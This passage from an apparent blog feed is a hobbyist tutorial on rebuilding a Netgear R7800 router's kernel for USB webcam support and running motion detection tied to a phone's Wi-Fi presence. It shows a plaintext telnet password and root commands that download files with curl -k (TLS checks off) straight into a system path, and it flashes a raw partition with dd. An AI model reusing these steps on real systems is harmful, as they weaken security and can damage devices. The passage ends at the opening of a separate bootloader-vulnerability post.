 &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="nv"&gt;LOGIN&lt;/span&gt; &lt;span class="o"&gt;===============================&lt;/span&gt;
  Please enter your password,It&lt;span class="s1"&gt;&amp;#39;s the same&lt;/span&gt;
&lt;span class="s1"&gt;  with DUT login password&lt;/span&gt;
&lt;span class="s1"&gt; ------------------------------------------&lt;/span&gt;
&lt;span class="s1"&gt;telnet password:JCVD4l1FE&lt;/span&gt;
&lt;span class="s1"&gt;=== IMPORTANT ============================&lt;/span&gt;
&lt;span class="s1"&gt; Use &amp;#39;&lt;/span&gt;passwd&lt;span class="s1"&gt;&amp;#39; to set your login password&lt;/span&gt;
&lt;span class="s1"&gt; this will disable telnet and enable SSH&lt;/span&gt;
&lt;span class="s1"&gt;------------------------------------------&lt;/span&gt;


&lt;span class="s1"&gt;BusyBox v1.4.2 (2017-08-29 13:01:25 CST) Built-in shell (ash)&lt;/span&gt;
&lt;span class="s1"&gt;Enter &amp;#39;&lt;/span&gt;help&lt;span class="s1"&gt;&amp;#39; for a list of built-in commands.&lt;/span&gt;

&lt;span class="s1"&gt;     MM           NM                    MMMMMMM          M       M&lt;/span&gt;
&lt;span class="s1"&gt;   $MMMMM        MMMMM                MMMMMMMMMMM      MMM     MMM&lt;/span&gt;
&lt;span class="s1"&gt;  MMMMMMMM     MM MMMMM.              MMMMM:MMMMMM:   MMMM   MMMMM&lt;/span&gt;
&lt;span class="s1"&gt;MMMM= MMMMMM  MMM   MMMM       MMMMM   MMMM  MMMMMM   MMMM  MMMMM&amp;#39;&lt;/span&gt;
&lt;span class="nv"&gt;MMMM&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;  MMMMM MMMM    MM       MMMMM    MMMM    MMMM   MMMMNMMMMM
&lt;span class="nv"&gt;MMMM&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;   MMMM  MMMMM          MMMMM     MMMM    MMMM   MMMMMMMM
&lt;span class="nv"&gt;MMMM&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;   MMMM   MMMMMM       MMMMM      MMMM    MMMM   MMMMMMMMM
&lt;span class="nv"&gt;MMMM&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;   MMMM     MMMMM,    NMMMMMMMM   MMMM    MMMM   MMMMMMMMMMM
&lt;span class="nv"&gt;MMMM&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;   MMMM      MMMMMM   MMMMMMMM    MMMM    MMMM   MMMM  MMMMMM
&lt;span class="nv"&gt;MMMM&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;   MMMM   MM    MMMM    MMMM      MMMM    MMMM   MMMM    MMMM
MMMM$ ,MMMMM  MMMMM  MMMM    MMM       MMMM   MMMMM   MMMM    MMMM
  MMMMMMM:      MMMMMMM     M         MMMMMMMMMMMM  MMMMMMM MMMMMMM
    MMMMMM       MMMMN     M           MMMMMMMMM      MMMM    MMMM
     MMMM          M                    MMMMMMM        M       M
       M
 ---------------------------------------------------------------
   For those about to rock... &lt;span class="o"&gt;(&lt;/span&gt;%C, %R&lt;span class="o"&gt;)&lt;/span&gt;
 ---------------------------------------------------------------
root@R7800:/# cat /proc/mtd &lt;span class="p"&gt;|&lt;/span&gt; grep kernel
mtd5: &lt;span class="m"&gt;00220000&lt;/span&gt; &lt;span class="m"&gt;00020000&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;kernel&amp;quot;&lt;/span&gt;

root@R7800:/# dd &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/dev/mtdblock5 &lt;span class="nv"&gt;of&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/mnt/sda1/kernel.img
&lt;span class="m"&gt;4352&lt;/span&gt;+0 records in
&lt;span class="m"&gt;4352&lt;/span&gt;+0 records out
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Kernel&lt;/h1&gt;
&lt;p&gt;Netgear has released &lt;a href="https://github.com/frederic/netgear-R7800-GPL"&gt;GPL source code&lt;/a&gt; for the Linux kernel used in this device. 
This copy on GitHub integrates few fixes to compile with newer GCC and V4L2 headers, and also the original kernel configuration dumped from live device.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ git clone https://github.com/frederic/netgear-R7800-GPL.git
$ &lt;span class="nb"&gt;cd&lt;/span&gt; netgear-R7800-GPL/
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Build mkimage tool&lt;/h2&gt;
&lt;p&gt;The &lt;em&gt;mkimage&lt;/em&gt; tool is used at the end of kernel building process to create the new kernel image partition for the device.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ make tools/mkimage/install
 make&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; tools/mkimage/install
 make&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; -C tools/sed compile
 make&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; -C tools/sed install
 make&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; -C tools/mkimage compile
 make&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; -C tools/mkimage install
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Add freshly built &lt;em&gt;mkimage&lt;/em&gt; binary to our PATH environment:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$PWD&lt;/span&gt;/build_dir/host/u-boot-2012.04.01/tools:&lt;span class="nv"&gt;$PATH&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Build Linux kernel&lt;/h2&gt;
&lt;p&gt;To build a kernel for this ARM-based device, we need to add a cross-compilation toolchain to our build environment :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ git clone https://android.googlesource.com/platform/prebuilts/gcc/linux-x86/arm/arm-eabi-4.8
$ &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$PWD&lt;/span&gt;/arm-eabi-4.8/bin:&lt;span class="nv"&gt;$PATH&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then we create a new kernel configuration based on the original one :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;cd&lt;/span&gt; git_home/linux.git/sourcecode/
$ make r7800_defconfig &lt;span class="nv"&gt;ARCH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;arm &lt;span class="nv"&gt;CROSS_COMPILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;arm-eabi-
$ make menuconfig &lt;span class="nv"&gt;ARCH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;arm &lt;span class="nv"&gt;CROSS_COMPILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;arm-eabi-
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In the kernel configuration menu, we enable the following options to get V4L2 &amp;amp; USB Video support :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Device Drivers ---&amp;gt;
-&amp;gt; &amp;lt;*&amp;gt; Multimedia support ---&amp;gt;
--&amp;gt; &amp;lt;*&amp;gt; Video For Linux
--&amp;gt; &amp;lt;*&amp;gt; Video capture adapters ---&amp;gt;
---&amp;gt; &amp;lt;*&amp;gt; V4L USB devices ---&amp;gt;
----&amp;gt; &amp;lt;*&amp;gt; USB Video Class (UVC)
----&amp;gt; &amp;lt;*&amp;gt; GSPCA based webcams
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;For info, that should correspond to these options :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;CONFIG_USB_VIDEO_CLASS=y
CONFIG_USB_GSPCA=y
CONFIG_VIDEO_V4L2_COMMON=y
CONFIG_VIDEO_V4L2=y
CONFIG_V4L_USB_DRIVERS=y
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finally, we build the kernel image :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ make -j8 uImage &lt;span class="nv"&gt;ARCH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;arm &lt;span class="nv"&gt;CROSS_COMPILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;arm-eabi-
&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
  Kernel: arch/arm/boot/Image is ready
  Kernel: arch/arm/boot/zImage is ready
  UIMAGE  arch/arm/boot/uImage
Image Name:   Linux-3.4.103
Created:      Mon Jan &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="m"&gt;23&lt;/span&gt;:58:38 &lt;span class="m"&gt;2018&lt;/span&gt;
Image Type:   ARM Linux Kernel Image &lt;span class="o"&gt;(&lt;/span&gt;uncompressed&lt;span class="o"&gt;)&lt;/span&gt;
Data Size:    &lt;span class="m"&gt;2210952&lt;/span&gt; &lt;span class="nv"&gt;Bytes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;2159&lt;/span&gt;.13 &lt;span class="nv"&gt;kB&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;.11 MB
Load Address: &lt;span class="m"&gt;41508000&lt;/span&gt;
Entry Point:  &lt;span class="m"&gt;41508000&lt;/span&gt;
  Image arch/arm/boot/uImage is ready
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Output kernel image is &lt;strong&gt;arch/arm/boot/uImage&lt;/strong&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ file arch/arm/boot/uImage
arch/arm/boot/uImage: u-boot legacy uImage, Linux-3.4.103, Linux/ARM, OS Kernel Image &lt;span class="o"&gt;(&lt;/span&gt;Not compressed&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="m"&gt;2210952&lt;/span&gt; bytes, Tue Jan &lt;span class="m"&gt;30&lt;/span&gt; &lt;span class="m"&gt;07&lt;/span&gt;:58:38 &lt;span class="m"&gt;2018&lt;/span&gt;, Load Address: 0x41508000, Entry Point: 0x41508000, Header CRC: 0x81013485, Data CRC: 0xDEA9B00E
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In current firmware, kernel partition size is 2228224 bytes. So the new kernel image cannot be larger.&lt;/p&gt;
&lt;p&gt;We copy that image to a USB drive and then, &lt;strong&gt;from the telnet shell&lt;/strong&gt;, we overwrite original kernel with the new image :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@R7800:/# dd &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/mnt/sda1/uImage &lt;span class="nv"&gt;of&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/dev/mtdblock5
root@R7800:/# sync
root@R7800:/# reboot
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;em&gt;Note: You have to enable telnet in WebUI after each reboot.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Now the router detects USB camera when plugged in :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;usb 3-1: new high-speed USB device number 5 using xhci-hcd
usb 3-1: New USB device found, idVendor=1908, idProduct=2310
usb 3-1: New USB device strings: Mfr=1, Product=2, SerialNumber=3
usb 3-1: Product: USB2.0 PC CAMERA
usb 3-1: Manufacturer: Generic
usb 3-1: SerialNumber: 20100331010203
INFO008C: Add device intf d39cc400, dev d39a5000
INFO0C15:  filter audio device
uvcvideo: Found UVC 1.00 device USB2.0 PC CAMERA (1908:2310)
input: USB2.0 PC CAMERA as /devices/platform/ipq-dwc3.1/dwc3.1/xhci-hcd.1/usb3/3-1/3-1:1.0/input/input3
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Install software packages&lt;/h1&gt;
&lt;p&gt;&lt;em&gt;"&lt;a href="https://motion-project.github.io/"&gt;Motion&lt;/a&gt; is a program that monitors the video signal from cameras. It is able to detect if a significant part of the picture has changed; in other words, it can detect motion."&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Fortunately, this package is available in OpenWrt repositories for our architecture.
And stock firmware includes the OpenWrt package manager &lt;strong&gt;opkg&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;However, &lt;strong&gt;opkg&lt;/strong&gt; is outdated and needs to be &lt;a href="https://gist.github.com/frederic/fcb7ddc14c46aa630143aaeafe2d706f"&gt;patched&lt;/a&gt; first :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@R7800:/# curl -k https://gist.githubusercontent.com/frederic/fcb7ddc14c46aa630143aaeafe2d706f/raw/8242c18a514f19b58c74387d4bfa0e5511bbb4e5/functions.sh -o &lt;span class="s1"&gt;&amp;#39;/lib/functions.sh&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then, we can install &lt;em&gt;motion&lt;/em&gt; &amp;amp; &lt;em&gt;libjpeg&lt;/em&gt; packages :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@R7800:~# curl -k https://raw.githubusercontent.com/frederic/netgear-R7800-GPL/master/ipk/libjpeg_9a-1_ipq806x.ipk -o /tmp/libjpeg_9a-1_ipq806x.ipk
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
&lt;span class="m"&gt;100&lt;/span&gt; &lt;span class="m"&gt;92994&lt;/span&gt;  &lt;span class="m"&gt;100&lt;/span&gt; &lt;span class="m"&gt;92994&lt;/span&gt;    &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;   259k      &lt;span class="m"&gt;0&lt;/span&gt; --:--:-- --:--:-- --:--:--  430k
root@R7800:~# opkg install /tmp/libjpeg_9a-1_ipq806x.ipk 
Installing libjpeg &lt;span class="o"&gt;(&lt;/span&gt;9a-1&lt;span class="o"&gt;)&lt;/span&gt; to root...
Configuring libjpeg.


root@R7800:~# curl -k https://raw.githubusercontent.com/frederic/netgear-R7800-GPL/master/ipk/motion_3.4.0-20141018-9479d910f2149b5558788bb86f97f26522794212-1_ipq806x.ipk -o /tmp/motion_3.4.0-20141018-9479d910f2149b5558788bb86f97f26522794212-1_ipq806x.ipk
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
&lt;span class="m"&gt;100&lt;/span&gt; &lt;span class="m"&gt;94802&lt;/span&gt;  &lt;span class="m"&gt;100&lt;/span&gt; &lt;span class="m"&gt;94802&lt;/span&gt;    &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;   297k      &lt;span class="m"&gt;0&lt;/span&gt; --:--:-- --:--:-- --:--:--  387k
root@R7800:~# opkg install /tmp/motion_3.4.0-20141018-9479d910f2149b5558788bb86f97f26522794212-1_ipq806x.ipk
Installing motion &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;.4.0-20141018-9479d910f2149b5558788bb86f97f26522794212-1&lt;span class="o"&gt;)&lt;/span&gt; to root...
Configuring motion.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Note that motion software expects its default configuration file at different path than the one actually provided. So we move it back to default path :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@R7800:/# mkdir /etc/motion
root@R7800:/# mv /overlay/etc/motion.conf /etc/motion/motion.conf
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Configuration&lt;/h1&gt;
&lt;p&gt;To enable motion detection only when our smartphone (hence we) is not at home, we call our custom script in Hostapd script &lt;strong&gt;/lib/wifi/wps-hostapd-update-uci&lt;/strong&gt;.
It will only be triggered when a station connects or disconnects from the router.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gh"&gt;diff --git a/lib/wifi/wps-hostapd-update-uci b/lib/wifi/wps-hostapd-update-uci&lt;/span&gt;
&lt;span class="gh"&gt;index f60abe3..dd6f3f2 100755&lt;/span&gt;
&lt;span class="gd"&gt;--- a/lib/wifi/wps-hostapd-update-uci&lt;/span&gt;
&lt;span class="gi"&gt;+++ b/lib/wifi/wps-hostapd-update-uci&lt;/span&gt;
&lt;span class="gu"&gt;@@ -157,6 +157,9 @@ check_ap_lock_down()&lt;/span&gt;
 }

 case &amp;quot;$CMD&amp;quot; in
&lt;span class="gi"&gt;+        AP-STA-CONNECTED|AP-STA-DISCONNECTED)&lt;/span&gt;
&lt;span class="gi"&gt;+                /etc/motion_cron.sh $CMD $3&lt;/span&gt;
&lt;span class="gi"&gt;+        ;;&lt;/span&gt;
        WPS-NEW-AP-SETTINGS|WPS-NEW-AP-SETTINGS-AP-PIN)
                local ssid=$(hostapd_cli -i$IFNAME -p/var/run/hostapd-$parent get_config | grep ^ssid= | cut -f2- -d =)
                local wpa=$(hostapd_cli -i$IFNAME -p/var/run/hostapd-$parent get_config | grep ^wpa= | cut -f2- -d=)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We create the following script in &lt;strong&gt;/etc/motion_cron.sh&lt;/strong&gt; :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/bin/sh&lt;/span&gt;
&lt;span class="c1"&gt;# Start or stop motion service depending on wifi client status&lt;/span&gt;
&lt;span class="c1"&gt;# Usage: motion_cron.sh [&amp;lt;event_type&amp;gt; &amp;lt;mac addr&amp;gt;]&lt;/span&gt;

&lt;span class="nv"&gt;HWADDR&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;00&lt;/span&gt;:11:22:33:44:55 &lt;span class="c1"&gt;# Update with your smartphone MAC address&lt;/span&gt;

&lt;span class="nv"&gt;CONNECTED&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
&lt;span class="nv"&gt;CMD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;motion
&lt;span class="nv"&gt;CMD_PID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/var/run/&lt;span class="nv"&gt;$CMD&lt;/span&gt;.pid
&lt;span class="nv"&gt;CMD_BIN&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/bin/&lt;span class="nv"&gt;$CMD&lt;/span&gt;
&lt;span class="nv"&gt;PID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;pidof &lt;span class="nv"&gt;$CMD&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="nv"&gt;$#&lt;/span&gt; -eq &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
 &lt;span class="nv"&gt;EVENT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$1&lt;/span&gt;
 &lt;span class="nv"&gt;EVENT_MAC&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$2&lt;/span&gt;
 &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$EVENT_MAC&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$HWADDR&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
  &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$EVENT&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; in
    AP-STA-DISCONNECTED&lt;span class="o"&gt;)&lt;/span&gt;
      &lt;span class="nv"&gt;CONNECTED&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
      &lt;span class="p"&gt;;;&lt;/span&gt;
    AP-STA-CONNECTED&lt;span class="o"&gt;)&lt;/span&gt;
      &lt;span class="nv"&gt;CONNECTED&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
      &lt;span class="p"&gt;;;&lt;/span&gt;
    *&lt;span class="o"&gt;)&lt;/span&gt;
      &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Non-interesting event, ignore...&amp;quot;&lt;/span&gt;
      &lt;span class="nb"&gt;exit&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
  &lt;span class="k"&gt;esac&lt;/span&gt;
  &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$EVENT&lt;/span&gt;&lt;span class="s2"&gt; &lt;/span&gt;&lt;span class="nv"&gt;$EVENT_MAC&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
 &lt;span class="k"&gt;else&lt;/span&gt;
  &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Not our MAC, ignore...&amp;quot;&lt;/span&gt;
  &lt;span class="nb"&gt;exit&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
 &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;span class="k"&gt;else&lt;/span&gt;
 &lt;span class="k"&gt;if&lt;/span&gt; grep &lt;span class="s2"&gt;&amp;quot;0x2\W\+&lt;/span&gt;&lt;span class="nv"&gt;$HWADDR&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; /proc/net/arp &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
  &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$HWADDR&lt;/span&gt;&lt;span class="s2"&gt; is connected in arp table&amp;quot;&lt;/span&gt;
  &lt;span class="nv"&gt;CONNECTED&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
 &lt;span class="k"&gt;else&lt;/span&gt;
  &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$HWADDR&lt;/span&gt;&lt;span class="s2"&gt; is disconnected in arp table&amp;quot;&lt;/span&gt;
  &lt;span class="nv"&gt;CONNECTED&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
 &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;span class="k"&gt;fi&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="nv"&gt;$CONNECTED&lt;/span&gt; -eq &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
 &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$HWADDR&lt;/span&gt;&lt;span class="s2"&gt; is connected&amp;quot;&lt;/span&gt;
 &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; -n &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$PID&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;
 &lt;span class="k"&gt;then&lt;/span&gt;
      &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$CMD&lt;/span&gt;&lt;span class="s2"&gt; is running, stopping it...&amp;quot;&lt;/span&gt;
      start-stop-daemon -K -x &lt;span class="nv"&gt;$CMD_BIN&lt;/span&gt; -p &lt;span class="nv"&gt;$CMD_PID&lt;/span&gt;
 &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;span class="k"&gt;else&lt;/span&gt;
 &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$HWADDR&lt;/span&gt;&lt;span class="s2"&gt; is disconnected&amp;quot;&lt;/span&gt;
 &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; -z &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$PID&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;
 &lt;span class="k"&gt;then&lt;/span&gt;
      &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$CMD&lt;/span&gt;&lt;span class="s2"&gt; is not running, starting it...&amp;quot;&lt;/span&gt;
      start-stop-daemon -S -x &lt;span class="nv"&gt;$CMD_BIN&lt;/span&gt; -- -b -p &lt;span class="nv"&gt;$CMD_PID&lt;/span&gt;
 &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;span class="k"&gt;fi&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;$HWADDR&lt;/strong&gt; has to be set to MAC address of our smartphone.&lt;/p&gt;
&lt;p&gt;As failsafe mechanism, we can also add this script to cron :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;  0 *  *   *   *     /etc/motion_cron.sh&amp;quot;&lt;/span&gt; &amp;gt;&amp;gt; /etc/crontabs/root
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finally, we edit the file &lt;em&gt;/etc/motion/motion.conf&lt;/em&gt; to configure motion. A &lt;a href="http://htmlpreview.github.io/?https://github.com/Motion-Project/motion/blob/master/motion_guide.html"&gt;guide is available on official motion website&lt;/a&gt;.
In addition of your own settings, I recommend to set the output storage path to an external USB drive :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;target_dir /mnt/sda1
&lt;/pre&gt;&lt;/div&gt;</content><category term="kernel"></category><category term="netgear"></category><category term="usb"></category><category term="v4l2"></category></entry><entry><title>SVE-2016-7930: Multiple buffer overflows in Samsung Galaxy bootloader</title><link href="https://fredericb.info/2017/07/sve-2016-7930-multiple-buffer-overflows-in-samsung-galaxy-bootloader.html" rel="alternate"></link><published>2017-07-23T00:00:00-07:00</published><updated>2017-07-23T00:00:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2017-07-23:/2017/07/sve-2016-7930-multiple-buffer-overflows-in-samsung-galaxy-bootloader.html</id><summary type="html">&lt;h1&gt;Prequel&lt;/h1&gt;
&lt;p&gt;On October 21st 2015, mobile forensics company &lt;a href="https://www.cellebrite.com/"&gt;Cellebrite&lt;/a&gt; published a video that demonstrates how their solution can dump eMMC of Samsung Galaxy devices :&lt;/p&gt;
&lt;iframe width="560" height="315" src="https://www.youtube.com/embed/ZsGBbswJGi4?rel=0" frameborder="0" gesture="media" allow="encrypted-media" allowfullscreen&gt;&lt;/iframe&gt;

&lt;p&gt;This video strongly suggests that Samsung Galaxy bootloader can be exploited to execute arbitrary code.&lt;/p&gt;
&lt;h1&gt;Summary&lt;/h1&gt;
&lt;p&gt;Several bugs in Samsung Galaxy bootloader allow an attacker with …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Prequel&lt;/h1&gt;
